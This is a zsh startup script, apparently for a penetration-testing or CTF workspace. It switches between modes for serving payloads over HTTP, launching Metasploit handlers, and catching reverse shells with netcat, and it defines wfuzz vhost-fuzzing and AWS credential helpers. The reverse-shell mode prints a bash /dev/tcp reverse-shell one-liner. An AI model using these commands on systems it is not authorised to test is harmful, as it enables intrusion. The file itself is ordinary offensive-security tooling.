# POST executed after the shell is loaded
# This file is loaded after .zshrc

# you can define any functions,settings,automation here. 

source ${PROJECT_FOLDER}/.vscode/env.zsh

if [ "$WEB_DELIVERY_MODE" ]; then
    if [ -z "$PROJECT_WEB_DELIVERY" ]; then
        echo "PROJECT_WEB_DELIVERY is not set. Please set it in .vscode/env.zsh"
    else 
        if [ -d "$PROJECT_WEB_DELIVERY" ]; then
            echo "FOLDER $PROJECT_WEB_DELIVERY exists."
        else
            mkdir -p $PROJECT_WEB_DELIVERY
            echo "*" > $PROJECT_WEB_DELIVERY/.gitignore
            echo "FOLDER $PROJECT_WEB_DELIVERY created."
        fi
    fi
    cd $PROJECT_WEB_DELIVERY
    export LISTEN_ON=8890
    echo ""
    echo "YOUR IP: $LHOST "
    echo "YOUR URL: http://$LHOST:$LISTEN_ON "
    echo ""
    python3 -m http.server $LISTEN_ON
    exit 0
fi 


export METASPLOIT_INIT_COMMAND="${METASPLOIT_INIT_COMMAND} setg RHOSTS $RHOST;"
export METASPLOIT_INIT_COMMAND="${METASPLOIT_INIT_COMMAND} setg LHOST $LHOST;"
export METASPLOIT_INIT_COMMAND="${METASPLOIT_INIT_COMMAND} setg LPORT $LPORT;"
export METASPLOIT_INIT_COMMAND="${METASPLOIT_INIT_COMMAND} setg VHOST $DOMAIN;"


if [ "$METASPLOIT_HANDLER_MODE" ]; then
    msfconsole -r "$PROJECT_FOLDER/.vscode/metasploit_handler.rc" \
        -x "${METASPLOIT_INIT_COMMAND}"
    exit 0
fi

if [ "$METASPLOIT_CONSOLE_MODE" ]; then 
    msfconsole -r "$PROJECT_FOLDER/.vscode/msfconsole.rc" \
        -x "${METASPLOIT_INIT_COMMAND}"
    exit 0
fi

if [ "$REVERSE_SHELL_MODE" ]; then
    echo ""
    echo "YOUR IP: $LHOST"
    echo "YOUR Reverse Shell Port: $LPORT"
    echo "Basic Revershell Command: "
    echo "  /bin/bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1"
    echo "Advanced: "
    echo "  https://rev.eson.ninja/?ip=${LHOST}&port=${LPORT}"
    echo ""
    rlwrap -I -cAr nc -lvvp ${LPORT}
    exit 0
fi

# Here is mode if-tree complete, Now will launch the shell
# export SUBDOMAIN_WORDLIST=$SECLIST/Discovery/DNS/bitquark-subdomains-top100000.txt
# alias wfuzz=/PATH/To/wfuzz / docker run --rm -it wfuzz
# alias wfuzz_http_vhost='wfuzz -c -w $SUBDOMAIN_WORDLIST -H "Host: FUZZ.$host" -u "http://$host"'
# alias wfuzz_https_vhost='wfuzz -c -w $SUBDOMAIN_WORDLIST -H "Host: FUZZ.$host" -u "https://$host"'

# automatically set the AWS environment variables from the json output of `aws sts assume-role` 
aws_sts_env () {
        if [[ -z "$1" ]]
        then
                echo "Usage: $0 \`json\`"
                echo "Example: export cred=\`aws sts assume-role --role-arn xxxx --role-session-name xxxx|jq ".Credentials"\`"
                echo "         aws_sts_env \$cred"
                return
        fi
        export AWS_ACCESS_KEY_ID=`echo $1|jq -r '.AccessKeyId' ` 
        export AWS_SECRET_ACCESS_KEY=`echo $1|jq -r '.SecretAccessKey'` 
        export AWS_SESSION_TOKEN=`echo $1|jq -r '.SessionToken' ` 
        echo "SET AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN in environment."
        env | grep --color=auto --exclude-dir={.bzr,CVS,.git,.hg,.svn,.idea,.tox} AWS | awk '{ print "export " $0 }'
}

# alias wfuzz= ?
unfunction wfuzz_vhost_http 
function wfuzz_vhost_http () {
    local host=$1 
    local wordlist=$2 
    if [[ -z $wordlist ]] || [[ -z $host ]]
    then
        echo "Usage: wfuzz_vhost <host> <wordlist> [wfuzz options]"
            return
    fi
    wfuzz -c -w $wordlist -H "Host: FUZZ.$host" -u "http://$host" $3 $4 $5 $6 $7 $8 $9 $10 $11 $12 $13 $14 $15 $16 $17 $18 $19
}

unfunction wfuzz_vhost_https
function wfuzz_vhost_https () {
    local host=$1 
    local wordlist=$2 
    if [[ -z $wordlist ]] || [[ -z $host ]]
    then
        echo "Usage: wfuzz_vhost <host> <wordlist> [wfuzz options]"
            return
    fi
    wfuzz -c -w $wordlist -H "Host: FUZZ.$host" -u "https://$host" $3 $4 $5 $6 $7 $8 $9 $10 $11 $12 $13 $14 $15 $16 $17 $18 $19
}


# Start the virtual environment if exists
if [ -d "$PROJECT_FOLDER/venv" ]; then
    if [ -n "${VIRTUAL_ENV}" ];then 
        echo "Virtual Environment is already activated."
        echo "Virtual Environment Home: ${VIRTUAL_ENV}"
    else
        source $PROJECT_FOLDER/venv/bin/activate
    fi
fi